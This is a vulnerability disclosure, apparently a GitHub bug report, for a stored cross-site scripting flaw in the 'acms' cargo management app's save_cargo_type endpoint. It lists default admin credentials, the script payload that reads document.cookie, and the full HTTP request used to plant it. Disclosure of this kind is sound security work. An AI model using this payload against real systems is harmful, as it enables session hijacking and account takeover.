BUG_Author: zihaokevinliu

Vulnerability url: /acms/classes/Master.php?f=save_cargo_type

POST form-data parameter name exists stored cross-site scripting

### Steps to reproduce

1.Go to the admin Login

http://localhost/acms/admin/login.php

Default Admin Access: Username: admin / Password: admin123

2.Click on Cargo Types and Click on +Create New

3.Put Payload into the 'Name' parameter.

Payload:<script>alert(document.cookie)</script>

![image](https://github.com/kev6798/bug_report/blob/main/xss1.png)

4.Click on Save

Transmission packet

```
POST /acms/classes/Master.php?f=save_cargo_type HTTP/1.1
Host: localhost
Content-Length: 754
sec-ch-ua: "Chromium";v="97", " Not;A Brand";v="99"
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarytCoLhgpe9jLppAEd
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
sec-ch-ua-platform: "Windows"
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/acms/admin/?page=cargo_types
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: revenue[LastUrl]=%2Frates%2Fadmin%2Fsystem_settingslist.php; PHPSESSID=sveoba7fn4a5emtg5365vkr68o
Connection: close

------WebKitFormBoundarytCoLhgpe9jLppAEd
Content-Disposition: form-data; name="id"


------WebKitFormBoundarytCoLhgpe9jLppAEd
Content-Disposition: form-data; name="name"

<script>alert(document.cookie)</script>
------WebKitFormBoundarytCoLhgpe9jLppAEd
Content-Disposition: form-data; name="description"

a
------WebKitFormBoundarytCoLhgpe9jLppAEd
Content-Disposition: form-data; name="city_price"

1
------WebKitFormBoundarytCoLhgpe9jLppAEd
Content-Disposition: form-data; name="state_price"

1
------WebKitFormBoundarytCoLhgpe9jLppAEd
Content-Disposition: form-data; name="country_price"

1
------WebKitFormBoundarytCoLhgpe9jLppAEd
Content-Disposition: form-data; name="status"

1
------WebKitFormBoundarytCoLhgpe9jLppAEd--
```

5.Payload will trigger when a user visits on http://localhost/acms/admin/?page=cargo_types

![image](https://github.com/kev6798/bug_report/blob/main/xss2.png)
